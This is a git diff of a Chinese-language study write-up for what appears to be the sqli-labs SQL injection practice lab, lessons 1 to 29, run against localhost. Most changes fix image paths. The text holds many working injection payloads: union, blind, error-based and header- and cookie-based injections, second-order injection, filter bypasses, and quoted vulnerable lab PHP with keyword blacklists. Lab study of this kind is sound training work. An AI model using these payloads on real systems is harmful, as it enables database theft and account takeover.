@@ -24,13 +24,13 @@
 
 攻击者试图通过在原始查询的末尾添加 ' 字符来终止原始查询，并注入他们自己想要执行的恶意代码。
 通过添加 `--` 字符，攻击者获得了多行注释标记，以防止后面的查询出现错误。
-![](爆显示位.png)
+![](./爆显示位.png)
 
 猜测登录名为第二列，密码为第三列
 
 `?id=-1'union select 1,database(),version()--+`
 
-![](爆版本号.png)
+![](./爆版本号.png)
 
 --+ 是一种特殊的语法，结合了单行注释和 URL 参数分隔符 + 。--+ 的作用是忽略查询语句中 ID 参数的剩余部分，
 并将其余部分都作为注释来处理。这样，攻击者就可以终止原始查询，并构造自己的查询语句，以利用 SQL 注入漏洞。
@@ -41,7 +41,7 @@
 
 `?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+`
 
-![](爆表.png)
+![](./爆表.png)
 
 我们得知当前数据库有四个表，emails，referers，uagents，users，密码可能是在users中，接下来
 要得到该表下的字段名和内容
@@ -49,13 +49,13 @@
 
 `?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+`
 
-![](爆字段名.png)
+![](./爆字段名.png)
 
 敏感字段自然就是username和password，得到对应字段的内容
 
 `?id=-1' union select 1,2,group_concat(username ,id , password) from users--+`
 
-![](得到结果.png)
+![](./得到结果.png)
 
 #### lesson2
 
@@ -63,7 +63,7 @@
 
 猜测为数字型注入
 
-![](数字型注入_1.png)
+![](./数字型注入_1.png)
 `?id=-1 union select 1,2,3--+`
 可知，1不显示，2显示为login name，3显示为password
 
@@ -76,19 +76,19 @@ Your Password:5.7.26
 
 `?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables
 where table_schema='security'--+`
-![](数字型注入_2.png)
+![](./数字型注入_2.png)
 
 数据库名为`database()`，表名有`emails,referers,uagents,users`
 
 `?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns
 where table_name='users'--+`
-![](数字型注入_3.png)
+![](./数字型注入_3.png)
 
 有价值的列为`username`和`password`
 
 ?id=-1 union select 1,2,group_concat(username ,id , password) from users--+
 
-![](数字型注入_4.png)
+![](./数字型注入_4.png)
 
 #### lesson3
 
@@ -121,7 +121,7 @@ where table_name='users'--+`
 
 结合题目说是要双引号
 
-![](lesson4.png)
+![](./lesson4.png)
 
 `http://127.0.0.1/Less-4/?id=-1%22)%20union%20select%201,2,group_concat(table_name)from%20information_schema.tables%20where%20table_schema=%27security%27--+`
 
@@ -139,7 +139,7 @@ where table_name='users'--+`
 确定长度再通过另外两个确定具体字符是什么，这需要花费大量的时间
 
 `?id=1' and length((select database()))>9--+`
-![](lesson5.png)
+![](./lesson5.png)
 这时没有任何显示，可知数据库长度小于9
 逐个尝试，得知`database()`长度为8
 
@@ -179,7 +179,7 @@ where table_schema=database()))>29--+`
 
 #### lesson7
 
-![](lesson7.png)
+![](./lesson7.png)
 可以看到是`‘`注入,因为实用单引号会报错，即破坏了原有的语法结构
 但是`?id=1'--+`依然报错
 那就再加`)`，`?id=1') --+`还是报错
@@ -211,26 +211,26 @@ if(a,sleep(10),1)
 #### lesson11
 之前的注入参数全部构造在`URL`里面，这种是`get`请求方式，现在第11关长这个样子
 
-![](lesson11.png)
+![](./lesson11.png)
 
 这样的方式叫做`post`请求，参数在表单里面，而且现在的参数不再是一个而是两个
 
 当输入错误时会返回错误信息
 
-![](lesson11_1.png)
+![](./lesson11_1.png)
 
 随便输一个错误请求，如`1'`
 
-![](lesson11_2.png) 提示了一串错误信息
+![](./lesson11_2.png) 提示了一串错误信息
 
 推测sql语句为`username='参数'` and `password='参数'`
 
 这里需要使用新的注释方式，不是`--+`而是`#`，具体可看
-![](lesson11_3.png)
+![](./lesson11_3.png)
 
 仅注入`Username=1' or 1=1#`完成了注入
 
-![](lesson11_4.png)
+![](./lesson11_4.png)
 
 又可以用`union select`了
 
@@ -262,7 +262,7 @@ id=1或者id=1'时无反应，id=1"时报错，那么就是`id=1"`且有括号
 `1") or 1=1#`
 
 #### lesson17
-![](lesson17.png)
+![](./lesson17.png)
 
 十七关和前面关很不一样，根据页面展示是一个密码重置页面，也就是说已经登录系统了，
 根据我们提供的账户名去数据库查看用户名和密码，如果账户名正确那么将密码改为我们输入
@@ -348,20 +348,20 @@ id=1或者id=1'时无反应，id=1"时报错，那么就是`id=1"`且有括号
 
 ```
 
-![](lesson17.png)
+![](./lesson17.png)
 
 尝试爆数据库名
-![](lesson17_1.png)
+![](./lesson17_1.png)
 
 
 #### lesson18
 18的源码里，无论是Username还是password都加了input检查
 但是这里有一个输出agent头的语句
-![](lesson18.png)
+![](./lesson18.png)
 
 阅读源代码可知，由于在agent注入前，先对用户名和密码进行了确定，所以需要输入一个正确的用户名密码才能引发注入
 
-![](lesson18_1.png)
+![](./lesson18_1.png)
 
 这里修改user-agent为`'or updatexml(1,concat(0x7e,(select database()),0x7e),1) or'`
 使用报错注入，这里爆到了数据库名为`security`
@@ -378,20 +378,20 @@ id=1或者id=1'时无反应，id=1"时报错，那么就是`id=1"`且有括号
 爆passwd和user
 
 #### lesson19
-![](lesson19.png)
+![](./lesson19.png)
 这回给了Referer
 在Referer进行注入
 
 
 `1',updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1))#`
 
-![](lesson19_1.png)
+![](./lesson19_1.png)
 
 #### lesson20
-![](lesson20.png)
+![](./lesson20.png)
 当正确输入时，cookie信息会被打印出来，因此对cookie进行注入
 
-![](lesson20_1.png)
+![](./lesson20_1.png)
 
 `Cookie: uname=Dumb' and updatexml(1,concat(0x5c,substr((select group_concat(username,password)from users),40,31),0x5c),1)#`
 
@@ -399,7 +399,7 @@ id=1或者id=1'时无反应，id=1"时报错，那么就是`id=1"`且有括号
 #### lesson21
 这回的Cookie有base编码
 
-![](lesson21.png)
+![](./lesson21.png)
 单引号的base编码是"Jw=="，代入发现还得有)
 
 `')and updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)#`这是注入代码
@@ -407,7 +407,7 @@ id=1或者id=1'时无反应，id=1"时报错，那么就是`id=1"`且有括号
 
 `JylhbmQgdXBkYXRleG1sICgxLGNvbmNhdCgweDVjLChzZWxlY3QgZ3JvdXBfY29uY2F0KHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHVzZXJzKSwweDVjKSwxKSM=`
 
-![](lesson21_1.png)
+![](./lesson21_1.png)
 
 注入成功
 #### lesson22
@@ -418,7 +418,7 @@ id=1或者id=1'时无反应，id=1"时报错，那么就是`id=1"`且有括号
 
 `id=1'`出现新的报错信息，肯定是单引号注入，但是后面的注释不管用
 
-![](lesson23.png)
+![](./lesson23.png)
 
 这里得知是注释符被过滤，既然无法注释后面的单引号，那么久要想办法构造补充前后的单引号
 
@@ -428,7 +428,7 @@ id=1或者id=1'时无反应，id=1"时报错，那么就是`id=1"`且有括号
 
 `?id=-1' union select 1,2,3 or '1'='1`
 
-![](lesson23_1.png) 这样就得知了网页的显示顺序
+![](./lesson23_1.png) 这样就得知了网页的显示顺序
 
 `?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1`
 
@@ -445,7 +445,7 @@ id=1或者id=1'时无反应，id=1"时报错，那么就是`id=1"`且有括号
 
 先注册一个账号叫`admin'#`,污染数据库，单引号是为了和之后密码修改时的用户们的单引号闭合，#是为了注释后面的数据
 
-![](lesson24.png)
+![](./lesson24.png)
 
 这时再修改密码，最后会修改`admin`管理员的密码，而不是`admin'#`的密码
 
@@ -468,3 +468,124 @@ id=1或者id=1'时无反应，id=1"时报错，那么就是`id=1"`且有括号
 #### lesson26a
 `?id=1%27%a0union%a0select%a01,group_concat(username),group_concat(passwoorrd)%a0from%a0security%2Eusers%a0where%a01%a0%26%26%a0%271`
 这东西Wiondows好像绕过不了
+
+#### lesson27
+这个题有很多过滤选项，具体来说是：
+```java
+function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
+$id= preg_replace('/[--]/',"", $id);		//Strip out --.
+$id= preg_replace('/[#]/',"", $id);			//Strip out #.
+$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
+$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
+$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
+$id= preg_replace('/union/s',"", $id);	    //Strip out union
+$id= preg_replace('/select/s',"", $id);	    //Strip out select
+$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
+$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
+$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
+$id= preg_replace('/Select/s',"", $id);	    //Strip out select
+return $id;
+}
+```
+所以需要绕过很多关键字，比如说
+
+`?id=1%27%20or%20(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(table_name))from(information_schema.tables)where(table_schema=%27security%27))),1))or%270`
+`selselecselecttect`其实是`select`的绕过三写
+
+`?id=1%27 or (updatexml(1,concat(0x7e,substr(selselecselecttect(group_concat(password,username))from(users),1,31),0x7e),1))or%270` 爆账号密码，当然这样会只显示一部分，所以要使用`substr()`
+
+`?id=1'or(updatexml(1,concat(0x7e,substr((selselecselecttect(group_concat(password,username))from(users)),30,31),0x7e),1))or'0`
+注意`substr`的使用方法，需要把它构造在`concat(0x7e,XXX,0x7e)`内部，并且其调用方法是`substr((),1,31)`
+
+#### lesson28
+先看这个题的过滤条件：
+```java
+function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
+$id= preg_replace('/[--]/',"", $id);				//Strip out --.
+$id= preg_replace('/[#]/',"", $id);					//Strip out #.
+$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
+//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.
+$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
+$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
+return $id;
+}
+```
+这个关卡过滤了注释符、`union select`、空格、+表示匹配一次或多次，/i表示不区分大小写，所以可以用`uni union%0Aselecton%0Aselect`来构造`union select`
+
+`union select 1,2,database()`爆表名得`security`
+`?id=0') uni union%0Aselecton%0Aselect%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema='security'%0Aand('1`爆information_schema.tables 得到表名
+
+`group_concat(column_name)from%0Ainformation_schema.columns where table_name ='users'`爆列名，得到`password`和`username`
+
+`?id=0') uni union%0Aselecton%0Aselect%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema='security'and('1`
+
+#### lesson29
+```java
+function whitelist($input)
+{
+	$match = preg_match("/^\d+$/", $input);
+	if($match)
+	{
+		//echo "you are good";
+		//return $match;
+	}
+  //函数接受一个参数 $input，表示要验证的输入。
+//使用正则表达式 /^\d+$/ 对 $input 进行匹配。该正则表达式表示输入必须由一个或多个数字组成，并且不允许包含其他字符。
+//使用 preg_match() 函数对 $input 进行匹配，并将结果存储在变量 $match 中。
+//如果 $match 的值为真（即匹配成功），则注释掉的代码部分会打印出 "you are good"，并返回 $match 的值。请注意，当前代码中这两行代码都被注释掉了。
+//如果 $match 的值为假（即匹配失败），则调用 header('Location: hacked.php') 函数将用户重定向到 hacked.php 页面。这是一种处理非法输入的方式，可以根据实际需求进行修改。同样地，当前代码中这行代码也是被注释掉了。
+	else
+	{
+		header('Location: hacked.php');
+		//echo "you are bad";
+	}
+}
+if(isset($_GET['id']))
+{
+	$qs = $_SERVER['QUERY_STRING'];
+	$hint=$qs;
+	$id1=java_implimentation($qs);
+	$id=$_GET['id'];
+	//echo $id1;
+	whitelist($id1);
+
+	//logging the connection parameters to a file for analysis.
+	$fp=fopen('result.txt','a');
+	fwrite($fp,'ID:'.$id."\n");
+	fclose($fp);
+// connectivity
+	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+	$result=mysql_query($sql);
+	$row = mysql_fetch_array($result);
+	if($row)
+	{
+	  	echo "<font size='5' color= '#99FF00'>";
+	  	echo 'Your Login name:'. $row['username'];
+	  	echo "<br>";
+	  	echo 'Your Password:' .$row['password'];
+	  	echo "</font>";
+  	}
+	else
+	{
+		echo '<font color= "#FFFF00">';
+		print_r(mysql_error());
+		echo "</font>";
+	}
+}
+```
+
+```HTML
+?id=1&id=-2%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+     爆表
+
+?id=1&id=-2%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=database() and table_name='users'--+   爆字段
+
+
+?id=1&id=-2%27%20union%20select%201,group_concat(password,username),3%20from%20users--+
+爆密码账户
+
+```
+这题我没怎么理解，我能看出来校正输入参数
